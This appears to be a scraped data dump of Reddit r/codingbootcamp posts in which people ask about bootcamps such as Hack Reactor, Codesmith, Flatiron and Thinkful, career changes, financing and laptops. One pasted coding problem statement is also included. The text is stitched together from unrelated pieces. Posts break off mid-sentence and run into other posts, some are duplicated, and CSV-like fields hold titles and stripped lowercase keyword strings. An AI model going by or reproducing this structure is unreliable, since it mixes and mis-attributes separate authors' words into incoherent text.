I'm currently enrolled in a 6 month web development course through 2U, and I've seen a lot of criticisms of the course, most of which are valid! They are by no means a perfect bootcamp that is going to get you great career connections and extremely knowledgeable support staff. And yes, you will have to do a lot of learning on your own. 

However, I'm really enjoying this course for two main reasons. The first, and most important, is that my employer is paying for it! These 2U courses are partnered with guild education, so any company that offers courses through guild as a benefit will pay for this course fully. And that makes most of the complaints about the course null, because it's not like I'm losing anything by doing this course.

 And the second reason is that it provides me with a timeline for my learning. My assignments have hard due dates and if I don't finish them I won't pass the course, and for me, that's enough motivation to stay on top of my work even though I'm working full time as well. If I did one of the free online bootcamps or courses I feel like I wouldn't have had the same motivation to get started, and as we all know, getting started is the hardest part. 

So, if you are in a similar situation to me, I hope this post helps you make the decision that is right for you! I really feel bad for the people who have to pay out of pocket for this course, but it's worth it when it's free!

codingbootcamp," **Problem Statement**

#### Ninja has been given an array ‘A’ of ‘N’ integers each element of the array will be from the numbers {4, 8, 12, 16, 20, 24} only, Ninja wants to remove a minimum number of elements from this array to make it strong.

#### An array of length ‘N’ is strong if ‘N%6’ is 0, and it is possible to split this array into the exact {4, 8, 12, 16, 20, 24} subsequences ‘N/6’ times.

#### Your task is to help Ninja to remove a minimum number of elements from this array to make it strong.

#### Note: Empty array is also a strong array.

&amp;#x200B;

 

##### Example:

    Input: 'N' = 6, 'A' = [4, 8, 12, 20, 24, 16]  Output: 6  In the given array, as the order of the elements is not according to the set we need to remove all six elements. Hence the answer will be 6.  Input: 'N' = 6, 'A' = [4, 8, 12, 16, 20, 24]  Output: 0  As the given array already contains the set {4, 8, 12, 16, 20, 24} in the order, we do not need to remove any element from it.  Input: 'N' = 6, 'A' = [4, 8, 12, 12, 16, 16]  Output: 6  As the given array is incomplete, we need to remove every element of it to make it strong.  Input: 'N' = 8, 'A' = [4, 8, 12, 12, 16, 16, 20, 24]  Output: 2  In the given array, if we remove the 3rd and 5th elements the resulting array will be the set {4, 8, 12, 16, 20, 24} which is a strong array. 

##### Input Format :

    The first line of input contains an integer 'T', denoting the number of test cases.   For each test case, the first line will contain integer 'N', the size of the input array; The second line will contain ‘N’ space-separated integers denoting the elements of array 'A'. 

##### Output Format :

    For each test case, print the minimum number of elements that need to be removed from this array to make it strong. 

##### Note :

    You don't need to print anything. It has already been taken care of. Just implement the given function. 

##### Constraints :

    1 &lt;= 'T' &lt;= 10 1 &lt;= 'N' &lt;= 10^4 'A[i]' will only be from the set {4, 8, 12, 16, 20, 24}  Time Limit: 1 sec 

##### Sample Input 1 :

    2 8 4 8 4 12 8 16 20 24 2 4 8 

##### Sample Output 1 :

    2 2 

##### Explanation Of Sample Input 1 :

    For the first test case, if we remove the third and fifth digit in the resulting array, we can form two subsequences {4, 8, 12, 16, 20, 24}.  For the second test case, if we remove both elements from an array, the resulting array will be empty, and this is the only way to make it a strong array. 

##### Sample Input 2 :

I'm leaning towards the python/Django stack camps but.. not many reviews on those to go off of, and python isn't a must but it does seems like the most translatable language outside of web app development.

Was looking into pdxcode guild but haven't received a call back from them, if anyone has any good things to say about that one let me know. The curriculum looks pretty good.

codingbootcamp,"Hello,

I’ve been in sales for the last 6 years and it’s been a constant struggle of commission check to commission check. It’s put my family through so much stress and I’m sick of it and want a stable career.

My State, Utah, has been completely overtaken by the tech industry and anything tech/coding/cs seems to be where the kind of money and possibly working remote opportunities would be.

But idk where to start or what to do. I’ve been told to take a coding bootcamp type program and I could walk out making 75K a year. Which didn’t work out for me in the past. I took a coding bootcamp from a company called Thinkful in 2016. I was still extremely noobish and struggled to find a job. I went to a few interviews but didn’t get anywhere. I ultimately put it on hold so I could get a retail sales job to support my new baby and eventually transitioned into Real Estate sales thinking I’d do half as well as my friends who got into it were doing. Thinkful started offering the 6 months job guarantee thing like right after my class and it’s been so long it’s fuzzy, but I’m pretty sure I asked if they would honor that for me too… but they said no.

I will do anything it takes. Within 3-4 months I’d like to have any kind of CS job so I can start making money. Idc if it’s minimal. But I have to start somewhere.

What kind of code, or niche programming would you recommend somebody start that leads to a job path quickly? I heard some good things about SQL recently but tbh I don’t know anything about it.

If there’s anybody here that’s in Utah or works for a company that offers remote jobs that has advice on how I can work my way into the industry please let me know. Id even be open for a zoom call or something too.

Oh PS here’s my old GitHub: https://github.com/darkstar93

My code isn’t terrible, but it’s not great either. Obviously very beginner for the time, and it’s been years since I’ve touched it. I couldn’t get a job then, and I doubt I could get a job with these projects as a resume now… so I’d like to improve to become job ready.

Thank you!

TLDR; Wen’t to a bootcamp ton 2016 and couldn’t find a job. Got into sales out of desperation to pay bills. Want to get off commissions and find a stable coding/tech/cs job now. Looking for advice on how to be job ready ASAP to support family. I live in Utah.

codingbootcamp,"I’ve been comparing a few different coding Boot Camp‘s and saw this one that looks pretty promising. It’s nine months for a full stack Boot Camp and is priced around $4000. It’s much cheaper than the general assembly and hack reactor boot camps but I believe that may be due to it having India based teachers. Not a problem at all but I am worried that the accent may be tough to follow at times.

Has anyone tried this Boot Camp or have any insights?

But I am really interested in starting, because I love math and friends told me it's the best way to combine my passion with something actually applicablein modern work market...

1. is it worth it, if I take some udemy programs in coding? I have found some that are pretty cheap (I would say suspiciously cheap), which is intriguing, but troubles me if I am going to be able to do something with these certifications.
2. what online boot camps would you suggest for someone with zero knowledge, to reach a certain level of intermediate to advanced? Are there any ones that are not extremely expensive? I care more for their applicability though, so I prefer paying more now but be able to earn more as well in the future.

codingbootcamp,"Hi 👋 I am a gen z person and I would like to know how to become a cloud computing engineer.

On the surface it looks extremely hard to learn. I know there's languages such as python, java, aws etc. These codes run and create things in apps and websites.

I was never too big on math in school. I obviously Know the basics however. 

So what kind of boot camps or training do I need? I feel like I need structure in order to learn this. Because doing it on my own might not work well with me.

I know these fields demand is only ever increasing and I can make huge amounts of money. And the opportunity is there.

codingbootcamp,"Hey everyone,

I've seen so much helpful information on this subreddit, and I want to say thank you. I'm looking to change careers, and I have the time and money to spend on a part-time bootcamp. I have tried self-taught, and I know I just work more efficiently when I have a schedule laid out and someone teaching me.

I've looked up a lot of coding bootcamps, but basically all of the part-time ones seem to have Saturday or Sunday from 9-4 (or something along those lines). I understand why, but unfortunately my schedule for work is working on weekends.

I mainly work with Epic and Cerner for those who know what they are. I travel for work and I do really well for myself. But my job requires traveling, it has to be in person.

I taught myself how to do HTML, I’ve worked a bit with SQL, taught myself video editing, photo editing, music producing, and so on. I’m very good with computers and I can learn quick. 

The only problem is, I have no bachelors and I don’t know where to start.

My questions are …
1) can I attend a boot camp with no college degree?
2) can I get a job once I complete the boot camp with no degree?
3) I make six figures a year, I know I’m going to have to take a pay cut if I start this journey.

It just feels so sketchy and pushy that I am altogether put off by the respective organizations. It happened to me with multiple bootcamps - General Assembly, Brainstation, etc. I understand they want to get me to buy in but honestly, do they really think aggressively forcing their services down my throat will make me magically interested? Does this sales tactic works with anyone? The only thing it does for me is make me question the integrity of those places.Why are coding bootcamps so aggressive in their sale tactics?",long time entertained idea signing coding aggressive sale tactic distrust organization motif every time mistake requesting course outline inundated daily email call urging sign class inconvenient part way unsubscribe actually talk representative explain interested sa stop calling work temporarily month start messaging feel sketchy pushy altogether put respective organization happened multiple general assembly brainstation etc understand buy honestly think aggressively forcing service throat magically interested sale tactic work thing integrity placeswhy coding aggressive sale tactic
codingbootcamp,"Dear Community,

In your experience what is the difference in quality of instruction and content coverage between the three very differently priced options that I am considering to learn programming:

1) Udemy $15 courses 

2) Online training providers like [https://www.developer-bootcamp.com/web-developer.htm](https://www.developer-bootcamp.com/web-developer.htm) ($1200 per course)

3) Online bootcamp prep courses e.g. [https://www.appacademy.io/course/bootcamp-prep-online](https://www.appacademy.io/course/bootcamp-prep-online) ( $1000)

There is a considerable difference in price so I am wondering what is the additional value provided by options 2 and 3?  Is it quality of instruction or the content? 

If you have experience with any of these then please share your experiences.

codingbootcamp,"Hi everyone, I was interested to get people's thoughts on the Hack Reactor 12-week ([fullstack javascript)](https://www.hackreactor.com/online-coding-bootcamp#Curriculum) vs 19-week ([javascript &amp; python](https://www.hackreactor.com/learn-python-learn-javascript#Curriculum)) immersive program, particularly in regard to the differences in curriculum. 

I've read through Hack Reactor's blog article on the program differences and their recommendations [here](https://www.hackreactor.com/blog/comparing-hack-reactor-software-engineering-coding-bootcamps), but was curious to hear from people of why they might have gone with one one option or the other. I'd be also curious to hear from more experienced veterans of the pros/cons of possibly going with one or the other (technically speaking). 

My initial impressions aside from the obvious difference in programming languages is that the 19-week program is more recently developed vs. their tried and true /established 12-week program (I'm also assuming maybe more recent trends/marketable skills are included in this newer curriculum?). It's certainly more popular as well, from what I can tell in terms of the cohorts tending to fill more quickly.

Oddly, Hack Reactor recommends the 12-week immersive for intermediate coders, and the 19-week for complete beginners. Yet, from the curriculum description, the 19-week immersive sounds way more technical. At least, it certainly name drops way more technical jargon than the description for the 12-week program, and seems to emphasise that you learn to build distributed/scalable applications, whereas none of those are mentioned in the 12-week program. The absence of details leads me to think you don't get those skills/know-how in a 12-week program, but I'm not sure if that's true? 

Based on their blog article, I would be the target demographic for their 12-week program. I already know some javascript and python, and have done some MOOC (CS50x, about half of c0d3). However, I feel like the 19-week program sounds more appealing because of the way it's advertised/described. I'm good at self-study, but honestly don't mind more initial hand-holding and structure early on. 

Anyways, to summarise: the Hack Reactor 19-week immersive is advertised as appropriate for beginners, whereas the 12-week is advertised as appropriate for intermediates. In contrast, the technical curriculum sounds more comprehensive in the 19-week vs the 12-week (or is that just my imagination?).

codingbootcamp,"For some brief backstory I have a Bachelors in Game Design from around ten years ago that my family pushed me into getting, I wanted to go for software engineering but that was a no-go, and my folks were paying for school so that was that. Since then I’ve had a pretty hard time finding good work; I worked at a Best Buy for three years, I did phone support for a hospital for a year, I tried to start my own PC repair business and couldn’t compete with Geek Squad, I drove for Uber for a while, and since the pandemic I’ve been out of work. Partway through the pandemic I decided to go back to school for Computer Science, and I was doing alright for a while but was forced to drop out after a hurricane tore my roof off. I did well in the programming courses, I did okay but not super well in the math courses, and I did pretty abysmally in the CompTIA cert courses. 

It’s probably worth mentioning I have a mild intellectual disability and a moderate physical disability both caused by the same medical issue. I used to be able to do physical work but can’t anymore, I’m pretty much limited to remote work these days. 

I looked into coding bootcamps around 2014 a couple years after I graduated but I didn’t really understand them. I kinda figured if everyone could learn code in six months there’d be no point in going to college, you know? A bunch of my friends did them and were placed in good jobs, but those bootcamps aren’t around anymore. I want to say Iron Foundry? Something with Iron in the name, out of Boston.  

Last I heard, Codesmith and Launch School are the two best ones, but that was a while ago. I also heard good things about Hack Reactor a while ago, not sure if they’re still considered good. Not a lot of places teach Ruby anymore which is odd because that’s what a lot of the jobs use.

Hi all,

Recently I finished undergrad with a physics degree. Now I’m looking for work and many software engineering positions list physics as an acceptable major. I want to apply to these but don’t believe I have enough experience; I am most familiar with python (I did my biggest project with it while in a research group) and have limited experience in C, Java, MATLAB (from course work). To prepare myself further I’m considering a boot camp or another online curriculum. 

I’ve seen c0d3 has been mentioned in a few boot camp threads and it seems enticing since it’s free but there doesn’t seems to be many reviews of it. Does anyone have experience? 

Other boot camps I’m considering are Launch School, Hack Reactor, and Codesmith. Can anyone describe their experience in these or recommend them? Any others? Are they worth the time and money? Or am I better off self studying? 

Are there any other tips or suggestion y’all have? 

(I also posted wanted to post this in r/cscareerquestions but didn’t meet the karma threshold. I’ll try again in the future) 

Thanks in advance",Physics undergrad with questions about software engineer positions and boot camps,"

codingbootcamp,"Hey everyone this is my first post here, the reason I am making this post is because I am currently enrolled in the Flatiron Software Course but honestly think I messed up by doing this. I am obviously new to this industry and my friend recommended it to me as she went through the same program, but I just have not been able to make time work. 

 I am months behind due to life issues and I have tried to reach out for any support or help and haven't really heard anything back. I am just curious as to if I should try to finish basically the rest of this on a crunched time frame, or look into different bootcamps where I can basically choose what I want to learn and take the L with flatiron.

I am stuck on ruby in the FI course, and like I said have the rest to go. I am not very interested in much backend work as the experience I have had with JS / HTML /CSS has been more enjoyable. I know FCC and The Odin Project have a lot of praise behind them, but my only worry with those compared to Flatiron is finding a job after. I would also be in the hole for taking the loan out for flatiron and not finishing the curriculum.

I do not believe flatiron self paced is for everyone, especially if you work full time and have other duties to take care of even after you are off. Maybe I am just bitter and upset, but thats my honest opinion as of now

I hate to be this guy to ask a question comparing computers but I really need some insight as this is a relatively large investment for me. I am going to be attending a full time coding bootcamp in the next month and its time to update my personal use computer as well. I will be using this laptop for 10-12 hours every single day for 3 months straight for my coding bootcamp as well as for my personal use laptop for what I would imagine being the next few years. The question is, should I opt for the smaller more portable laptop with newer technology (m1 chip), or go for the larger screen space to make workflow easier and get a slightly dated laptop with intel technology that it seems will not be used by apple for much longer? My bootcamp will be remote so I wont be lugging it around all that much, but could use some input on what you guys think.

codingbootcamp,"I have a friend in their mid-50's, no college degree and burned out of community college. No judgement meant but they almost certainly have undiagnosed ADHD as well (I have diagnosed ADHD so I recognize a lot of the traits). My friend also has pretty much zero drive or initiative.

They are eager to soon start General Assembly, having already quit their well-paying but ungrateful job in a front office environment. It was truly soul-sucking and boring work, apparently, so I get that staying put in spite of the pay was not an option.

My friend tells me they don't have to pay for the coding boot camp at all until they get a job afterwards. Well honestly, I doubt their ability to network, I worry about the ageism of our area, and there are some other personal factors that truly cannot be helped which will likely work against my friend (or at least I fear as much).

They will be using their retirement funds to sustain themselves during the boot camp and while looking for work afterwards (rent, food, etc.). Already they are being a bit reckless with funds... They have no computer experience to speak of either, which worries me further.

Unfortunately I cannot say a word about anything to this friend. They angrily tell me people are homeless because the homeless ""don't try hard enough"" and other such nonsense about the world. Mind you, I was homeless at the time.

I am doubtful about my friend actually making it in coding, but because everyone is always thwarted from getting real with them, I feel like all I can do is watch the impending eviction from their rent-controlled place upon blowing out of General Assembly or ""just"" having a really rough time getting a job afterwards.

I hope folks here can be real with me. *Can* people with ""lots going on"" and not a lot of self discipline make it during and after coding boot camp? This friend drives me bonkers, as you can surely tell, but they deserve good things and I really hope this is not the beginning of a long and painful decline in their quality of life - to say nothing of stress levels.

I am below novice level but I want to learn and I want to pursue but I feel completely overwhelmed and even looking into it on my own has proven overwhelming because a lot of the info I run into isn't very explanatory or speaking my language to help me understand better.

In other words, I need serious help. Where do I start in this adventure and what do I start with learning on my own to help me feel more comfortable going into this unfamiliar territory ?

Literally any help is appreciated, links to vids, websites, audio books and other such material to help me get a footing in this because I am essentially a Neanderthal in this situation. Motivational movie speeches are also accepted to boost optimism 😅For the love of God help me",recently decided wanted cyber security start way coding programming decided starting cold foot realizing actual knowledge field term language anything already novice level learn pursue feel completely overwhelmed even proven overwhelming info run isnt explanatory speaking language understand better word serious start adventure start learning feel comfortable unfamiliar territory literally appreciated link vids website audio book material footing essentially neanderthal situation motivational movie speech accepted boost optimism love god

codingbootcamp,"Think of this as an ongoing blog that hopefully will stand as an informative anecdote for others considering the path.

I loved computers and coding as a young person, got a Vic 20 at 5 years old, commodore 128 at 8, and had desktops through 2001 or so. Taught myself basic out of the back of the Compute Gazette magazines. Learned Pascal, and later C to help code for MUDs(world of War craft for your parents day).

I got away from that stuff as my adult life started, was a multi unit manager for national restaurant chains for about a decade, then sold everything, boat a big sailboat and worked as a bartender in the keys in between cruises to the Bahamas for a few years. It worked well. Between my wife and I bartending and waiting tables during the busy season we could make in 6 months enough money for all our expenses, boat repairs/upgrades and the 6 months sailing the Bahamas. 

Sadly, now at 43, the body won't support the physical grind of that kind of work, its fun and lucrative,  but, intense on the feet, legs, back and hips. I've been battling mild to occasionally severe psiatic issues for a couple years.

And like many people, the covid mess led to some reassessment. And, traveling by boat is frankly scary as all hell. The ocean is pretty from the beach, she's quite a terrifying batch when you travel her. Plus the whole point of the boat is as a means to travel and do so on longer term a longer term basis than 2 weeks vacation a year. 

So, as most people on this forum are aware, there is an explosion and long term trend towards work from home coding jobs. I knew I enjoyed coding and was good at it from my experiences 20 years ago. 

So I started researching. Finally settled on Hack Reactor 12 week Javascript full stack immersive. Based on a combination of the material and schedule fitting my needs and the overall success level of those entering in the program. I also liked that the admissions process while not onerous, does require a lot of work, studying, practicing and proof of concept that those accepted have a decent chance of success. Also, they offer an ISA, which, while I don't *need* it allows me to hedge my bets a bit by paying half in cash and half in ISA. If it doesn't work out, as a tipped employee, im unlikely to ever meet the repayment requirements should I not get into SWE. 

So, I signed up, took a Wonderlic style aptitude test, passed, then started thier prep work. The prep work is geared to teaching you what you need to pass a technical admissions test. Roughly 30 days, average of 2 hours a day, and I passed the test first attempt. 

During this, the staff at Hack Reactor/Galvanize has been excellent. Queries via email are responded to professionally and openly, while they are all encouraging, there also doesn't seem to be a push to get people in who the program may not be right for. It seems thier business is focused on high success rates rather than just getting as many students as possible like some seem to. 

My course starts in April. The pre-workout the give before the course starts must be completed and tested prior to the start of the class, its given 4 to 6 weeks before the start date and is expected to take 150 hours to complete.  

Since I started early, I won't get my official precourse work for another few weeks. In the meantime I'm using The Odin project to learn as much html/css as possible and DOM manipulation. My goal there is to have a 3 to 5 page website that looks good and has functionality built in with javascript and some backend storage/retrieval.

Fortunately for me, having been a sailor the last 6 years, I've met a lot of people and unsurprisingly quite a few of them do this sort of work remotely, and a couple are actually in the business of hiring people to do this sort of thing remotely, so I have a bit of a head start in the networking thing. One friend wants to set me up interviews a couple weeks before the course ends. 

So, my primary goal is remote work. At 44, I don't care about a career path up to project lead or anything like that. The way we live, with even just 50 to 60k a year, we can use remote worker visas to live for a year jn 20 other countries for the next 2 decades.

I also realize that fully remote jobs are more competitive and its likely ill end up taking an on-site job for a year or so until my resume is competitive enough to get the remote work I want, or have enough portfolio I can freelance 

So far so good. I'm great with the JS problem solving aspects, those are fun. HtML and CSS are...  annoying to say the least. It looks like a structural nightmare thats grown up over the last 20 years based on a language that wasn't intended to meet the needs of the modern web, but, it is what it is and I'm slogging through it.

codingbootcamp,"Hi everyone! I commented on one of the posts and people have asked and DM'd me for an update. I figured I'd post here so everyone can see the info. 

I joined Remote Part time program in March and completed it in this December. I have no prior coding experience, but had a good understanding on how computers work. Zero friends in tech, so no connections either. My previous work experience was in Retail and Supply Chain, so I had a lot of soft skills to begin with. 

The beginning of the program was challenging due to it's fast pace, however, given that we were working in part time cohort, it was manageable. I really liked the structure of the program and the curriculum. Staff was always very friendly and professional and I made a few friends throughout the program. I honestly miss the community a lot and here and there I pop into the zoom room of the newer cohorts to say hi and share stories. This mindset is not only mine, a lot of the people that went through the program in my cohort feel strongly the same. 

What helped me connect and bond with the community was to actively participate in class and work with fellow students on troubleshooting code together. You really get to know each individual student on a deep level and for me that was the best part of the program. Going through the struggles and growing together. 

I wish the program had more one-to-one interactions to review code and figure out best practices, but I was okay without it too. This support is there, but most of the time you have to seek it out on your own. I think that's just the way bootcamps are. 

I applied for the ISA and I'm still on the grace period which is nice. Last month of the program prepares you in heavy detail for applying for jobs. My friends from the cohort had good experience interviewing. Some got offers right away, some are still searching. But Hack Reactor name and effort we put in the program is definitely getting great attention and impression. 

I burnt out towards the end of the program and had to take time off after completing it to get back into routine and see some friends. I applied to 5 jobs, got 3 rejections (they responded, yay!) and 1 yes. which i accepted. 

Overall, I'm very happy with the program, experience, skillset learned and final outcome and would highly recommend it to anyone, however, please understand it's not a walk in the park and it requires some serious sacrifice on your end. I've missed weddings, funerals, birthdays, haven't seen family or friends that entire year, lost 3 jobs and had to job hunt while doing the program and had covid and fever on top of all that. A few times throughout the program I was on the edge of quitting due to burnout, but mentors and fellow students were beyond helpful in pushing me and helping me prioritize my health and getting back to normal. Half the people that signed up left the program early for personal reasons or because it was too difficult. You have a chance to redo it, but it's painful seeing people go.",Just graduated Hack Reactor - AMA,"Hi everyone! I commented on one of the posts and people have asked and DM'd me for an update.

I burnt out towards the end of the program and had to take time off after completing it to get back into routine and see some friends. I applied to 5 jobs, got 3 rejections (they responded, yay!) and 1 yes. which i accepted. 

Overall, I'm very happy with the program, experience, skillset learned and final outcome and would highly recommend it to anyone, however, please understand it's not a walk in the park and it requires some serious sacrifice on your end. I've missed weddings, funerals, birthdays, haven't seen family or friends that entire year, lost 3 jobs and had to job hunt while doing the program and had covid and fever on top of all that. A few times throughout the program I was on the edge of quitting due to burnout, but mentors and fellow students were beyond helpful in pushing me and helping me prioritize my health and getting back to normal. Half the people that signed up left the program early for personal reasons or because it was too difficult. You have a chance to redo it, but it's painful seeing people go.Just graduated Hack Reactor - AMA",hi everyone commented post asked dmd update figured id post everyone see info joined remote part time program march completed december prior coding experience understanding computer work zero friend tech connection either previous work experience retail supply chain soft skill begin beginning program challenging due fast pace however given working part time cohort manageable liked structure program curriculum staff always friendly professional made friend throughout program honestly miss community pop zoom room newer cohort say hi share story mindset mine went program cohort feel strongly helped connect bond community actively participate class work fellow student troubleshooting code together individual student deep level best part program struggle growing together wish program onetoone interaction review code figure best practice okay without support time seek think thats way applied isa still grace period nice last month program prepares heavy detail applying job friend cohort experience interviewing got offer right away still searching hack reactor name effort put program definitely getting great attention impression burnt towards end program time completing back routine see friend applied 5 job got 3 rejection responded yay 1 yes accepted overall happy program experience skillset learned final outcome highly recommend however please understand walk park requires serious sacrifice end missed wedding funeral birthday havent seen family friend entire year lost 3 job job hunt program covid fever top time throughout program edge quitting due burnout mentor fellow student beyond helpful pushing helping prioritize health getting back normal half signed left program early personal reason difficult chance redo painful seeing gojust graduated hack reactor ama
codingbootcamp,"I have been trying to teach myself coding for literally 5 YEARS now but I learned more during the prep work for Thinkful and the Bootcamp for FA in literally a month than I have these past 5 years so I think the bootcamp route is right for me instead of self-teaching but now I am stuck with deciding between the 2. 

Which one of the 2 would have the better curriculum between FA and Thinkful or are they comparable in terms of quality? I looked at the reviews but I am not sure that the reviews for FA are authentic. If anyone has any insight or experience, please lmk. thanks

Hello tech bros! I need help!

I have been interested in the tech industry for some time and I need to make a move soon when it comes to getting a career. Currently, I'm a bartender with no tech experience and with no college degree. I have been looking into these roles recently: Cybersecurity, Coding, UI/UX. so far these 3 have been very interesting and I have done enough research to get a small grasp of what it's like. However I'd like some advice from you guys and what you think would be best for me. I understand I have no college degree or any experience but I have researched schools on these roles as well. I'm nearly going to hit 30 so I'd like a stable for myself and I'm motivated to make a change in my life.

A little about myself: I like to create, I'm very tech savvy to the point where I've built my first PC (which I'm very proud of) and I'm passionate when I stick to one thing, I'm very loyal and always by the book, I like to get comfortable where I work, and I always get along with my co-workers. I also like to keep a balance with work and life.

Thank you for taking the time to read this, it will help!",How do I know which tech career is right for me?,"

Pros/Cons for me personally: Thinkful offers a tuition refund guarantee, while Hack Reactor does not. Hack Reactor seems to have better alumni placement at larger tech companies (Google, Airbnb, etc). Another key difference is that Hack Reactor will cover Python and Thinkful will not. 

For what it's worth, I already have spent ~6 years working at two different FAANG companies (operations roles), so I'm not quite sure the alumni thing matters as much as me gaining the necessary coding skills needed to perform the job (without taking a large risk in the process). 

Any thoughts would be much appreciated!

codingbootcamp,"Hi there,

I am currently a cook in the SF Bay Area. I have been in the industry for almost 8 years and love what I do and the creativity of the industry. However, the lifestyle is not very compatible to the lifestyle I hope for now that I am thinking of having a family and how this job keeps me always from home for many hours of the day.

On top of that, I am tired of not making a very good salary, my body having to physically be in a place to work regardless of my health etc….

I have been thinking more and more of doing a boot camp because it seems like something I would enjoy. I am a fast learner and I could potentially get a side gig to save some real money to figure out if I want to stay in the restaurant industry or change my career completely.


I know this is a shot in the dark, but if anyone has any form of advice or opinions I’d love to hear.

codingbootcamp,"I recently didn't pass the on-site bootcamp admission test. So I was looking at other options and found that many other academies only have online bootcamp at the moment due to Covid. 

Online bootcamp was not an option for me but since I didn't pass the on-site bootcamp test, this became one option. However, I'm still skeptical about it. Though it's live and everything, is it really worth it? 

I wanted to do on-site one because it would actually make me go there and learn/ask teachers&amp;friends and get help. Like push me to study and use the given environment. I'm not sure if I'd do as much as I'd have done at class if I were home doing zoom live study.(never tried tho)

codingbootcamp,"Hi all. I have posted on here a number of times, I was intending to do an in person bootcamp and started self teaching front end stuff in October. I was on track to do a bootcamp in January, then pushed back to March. Well, now its pushed back *without* timeline haha... I can only laugh and move on because of this sub. Most helpful people on here are transparent and let others know thing going on, what to avoid, how to go about joining bootcamps. You all have been a ton of help, and really have made the process easier, as well as shared even your mistakes. I do not feel alone, even though I just self teach and have yet to code with anyone on a project. I am writing this just to share the road I have been on while trying to switch careers at 26. 

Before I expand on the road/life-happens stuff, I just want to again reiterate how *awesome* and *helpful* this sub is, that without having came across this, I am **100%** sure I would just be walking away (ADHD pi, very good at burning bridges). But because of such a positive experience and community (*usually haha*) I am more motivated now than before to be able to make a coding bootcamp a reality again. Cheers to loads more self teaching, even if it means putting off job placement opportunities a little bit!

Well my car was hit while parked by a drunk driver here in California. Long story short, I only received 25% of total damages and now its salvaged title, along with not being driven for the last 3 months. 

Well bootcamp was pushed back to fix my car, drove it 2 days and it stalls - turns out to be another 50% increase in damages all electrical related (too bad so sad already paid out, would not get more anyways). So I will be going back to waiting tables to pay off the fixes needed to get my car running. And when that happens I can pick a more concrete date to start a bootcamp again. 

I hope this is not a weird post lol, but I just have been feeling a little overwhelmed about my car, and definitely was not happy about it of course... but then coming on here, reading all that is posted, seeing the replies - it really just makes me feel better, and brings me back to the motivation to stay in it! Heres to anyone out there doubting if they can figure out a way to do a bootcamp; I know everyones day to day life is wildy different, and my current life-happens issue probably does not seem bad, but it is my issue that holds me back, but I will come above it and figure it out!","Putting off bootcamp - This sub has been a God send, thank you all.","Hi all.

So far CodeSmith (remote) is looking like the one I’m going to go to because not only is it CIRR audited, I’ve been emailing with one of their reps who’s answered every question happily, honestly and in great detail. She’s been pointing me in directions I didn’t even think to look, their free prep courses, their free events (I’ve signed up for two) and they’ve got some really solid scholarship options to apply to. 

I’m aware of The Odin Project, Leon Noel, and I’m currently learning basics on freeCodeCamp.org. I’ve decided against TOP due to the fact they seem to only get hired if they have full on degrees in something that’s not related but still says they have a college level education. My schedule doesn’t allow me to attend Leon Noel’s live streams. I’m aware free code camp is just the basics but It’s my best option right now to prepare for a boot camp.

codingbootcamp,"Hi,

I'm currently researching bootcamps and Nucamp seems to be the best for my current life situation. It's online and can be done part time at my leisure. I have a BSc in Mathematics and worked as a research assistant in mathematical modelling. Programming is not entirely new to me as I had to take courses in undergrad (beginner and intermediate Java, and other courses required MATLAB and Maple coding) and had to learn various things at my previous jobs, and I've also taught myself python as I enjoy doing machine learning projects for kaggle in my spare time.

I never really got a good job after I left school and left my research assistant position. In fact, I've been severely underemployed since then, working jobs nowhere near relevant to my education or experience. I enjoy programming and really love tinkering with code and solving problems, it was always enjoyable to me.

My biggest concern is getting a job afterwards, since this is a big commitment and it's a lot of money to me. Is the job market for this type of SWE still decent for entry level candidates? I know for a fact my city is way oversaturated for all tech roles as everyone wants to live here (Vancouver), so I would look for a remote job or simply move to another city nearby.

codingbootcamp,"Some background on myself is that I have a Bachelor's in Business and am approaching this bootcamp with the intention of making a career change. Up until recently I have had next to no coding experience at all, however in the past few 2 weeks or so I have been putting in hours everyday learning everything I can, mostly through Codesmith CSX and a little time spent on phone apps such as SoloLearn. Because of what I have read about Codesmith, I am using all of this turn to focus strictly on JavaScript only, and not waste the limited time I have in learning HTML or CSS or any of the other languages. Am I correct in doing this?

My questions are regarding the best and most efficient way to prepare for the Full-time immersive which is starting March 21st 
(with the Application deadline of Feb 04,
Initial interview deadline of Feb 11, and
Technical interview deadline of Feb 19). This gives me just under 2 months time to prepare with the little experience I have, so I really want to use this time wisely.

What do you believe are my best resources to practice and study in preparation for getting accepted into, and being prepared for the full time course? I have already signed up for JS for Beginners, which the closest upcoming one begins February 12 and lasts until Feb 21st. Next I plan on taking CS Prep, however the  problem is that I can either take it Feb 14-28 (which would overlap with the JS for Beginners course although both are in Saturdays they would just end up being back to back) or Feb 28-March 14. It seems obviously to me to not overlap and take both at the same time, but with the technical interview of the nearest full time immersive being on March 5th, is it possible that I will be prepared to pass this interview before finishing CS Prep? It seems silly to me them scheduling the courses on these dates seeing as most students who plan to take the full time immersive will most likely take CS Prep to prepare for the closest upcoming course, but with the technical interview for full time being before the end of CS Prep will this be possible to do?

My last question is, besides these two courses, CSX, the slack channel, and the workshops offered (hard parts and Pair Programming), what other ways would be the best use of my time to prepare for the full time course? Should I take a specific Udemy Course on JavaScript that teaches what I won't learn in the JS for Beginners or CSX guides? Should I use Freecodecamp's JavaScript Algorithms and Data Structures (300 hours so not sure I will be able to complete in full)? Should I study or complete any specific parts of the p1xt guides? There are so many different resources out there but with my limited time, I feel only the students who have had experience with the program and know the admissions process can lead me in the right direction of what I really need to know and what may be a waste of time?

I hope this isn't asking too many questions, but I have spent much time reading posts from past Codesmith grads trying to figure out how to best prepare and would rather spend my time studying! I thank anyone who has read this and is willing to offer some insight, because I'm hoping by the end of this, I will have a better life and the skills to succeed.",Questions about preparation for codesmith. Any insight greatly appreciated!,"Some background on myself is that I have a Bachelor's in Business and am approaching this bootcamp with the intention of making a career change. Up until recently I have had next to no coding experience at all, however in the past few 2 weeks or so I have been putting in hours everyday learning everything I can, mostly through Codesmith CSX and a little time spent on phone apps such as SoloLearn. Because of what I have read about Codesmith, I am using all of this turn to focus strictly on JavaScript only, and not waste the limited time I have in learning HTML or CSS or any of the other languages. Am I correct in doing this?

My questions are regarding the best and most efficient way to prepare for the Full-time immersive which is starting March 21st 
(with the Application deadline of Feb 04,
Initial interview deadline of Feb 11, and
Technical interview deadline of Feb 19). This gives me just under 2 months time to prepare with the little experience I have, so I really want to use this time wisely.

